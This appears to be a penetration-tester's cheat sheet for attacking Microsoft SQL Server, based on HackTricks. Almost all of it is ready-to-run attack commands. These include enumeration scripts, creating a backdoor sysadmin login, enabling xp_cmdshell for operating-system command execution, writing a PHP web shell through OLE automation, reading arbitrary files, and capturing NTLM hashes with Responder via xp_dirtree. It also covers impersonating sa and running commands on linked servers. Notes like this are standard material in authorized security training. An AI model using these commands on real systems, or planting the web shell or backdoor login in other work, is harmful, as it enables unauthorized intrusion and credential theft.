* Enumeration using Nmap: `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>`
	* Nmap NSE scripts: `ls /usr/share/nmap/scripts | grep ms-sql`
* Metasploit: `scanner/mssql/mssql_ping` auxiliary module
* Interacting with MSSQL:
	* `impacket-mssqlclient <user>@<ip> -windows-auth`
	* `sqsh -S <ip> -U <user> -P <password>`
	* `sqlcmd -S <servername> -U <user> -P '<password>' -y 30 -Y 30`
		* `-U .\\<user>` for windows login.
* Commands on MSSQL: 
	* Get version: `select @@version;`
	* Get user: `select user_name();`
	* Get databases: `SELECT name FROM master.dbo.sysdatabases;`
	* Use database: `USE <database>`
	* Get table names: `SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;`
	* List Linked Servers:
		* `EXEC sp_linkedservers`
		* `SELECT * FROM sys.servers;`
	* List users: `select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;`
	* Create user with sysadmin privs: 
			* `CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'`
			* `EXEC sp_addsrvrolemember 'hacker', 'sysadmin'`
* Command execution:
	* Enabling xp_cmdshell: `EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
	* `xp_cmdshell <command>`
* File write:
	* Enable Ole Automation Procedures: `EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;`
	* Write File:
	```
	1> DECLARE @OLE INT
		2> DECLARE @FileID INT
		3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
		4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<filepath>', 8, 1
		5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
		6> EXECUTE sp_OADestroy @FileID
		7> EXECUTE sp_OADestroy @OLE
		8> GO
	```
* Read files: `SELECT * FROM OPENROWSET(BULK N'<file>', SINGLE_CLOB) AS Contents` 
* Authentication capture with responder:
	* On kali: `sudo responder -I <interface>`
	* On target: `EXEC master..xp_dirtree '\\<ip>\share\'` or `EXEC master..xp_subdirs '\\<ip>\share\'`
* User impersonation:
	* Identify Users that We Can Impersonate:
	 ```
	 1> SELECT distinct b.name
	2> FROM sys.server_permissions a
	3> INNER JOIN sys.server_principals b
	4> ON a.grantor_principal_id = b.principal_id
	5> WHERE a.permission_name = 'IMPERSONATE'
	6> GO
	```
	* Impersonating as SA: 
	 ```
	 1> EXECUTE AS LOGIN = 'sa'
	2> SELECT SYSTEM_USER
	3> SELECT IS_SRVROLEMEMBER('sysadmin')
	```
* Finding linked and remote servers:
	* List linked servers: `SELECT srvname, isremote FROM sysservers`
	* Execute command at remote linked server: `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<ip>\SQLEXPRESS]`
* Tools: `dbeaver`, `mssql-cli`, `mycli`, `mssqlclient.py`, `dbeaver`, `MySQL Workbench`, `SQL Server Management Studio or SSMS`
* Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server